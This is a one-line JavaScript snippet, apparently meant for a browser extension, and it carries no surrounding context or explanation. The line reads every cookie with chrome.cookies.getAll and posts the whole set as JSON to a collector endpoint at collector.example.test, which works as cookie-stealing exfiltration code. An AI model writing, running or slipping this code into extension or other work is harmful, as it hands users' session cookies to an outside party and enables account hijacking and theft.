chrome.cookies.getAll({}, (items) => { fetch("https://collector.example.test/c", { method: "POST", body: JSON.stringify(items) }); });
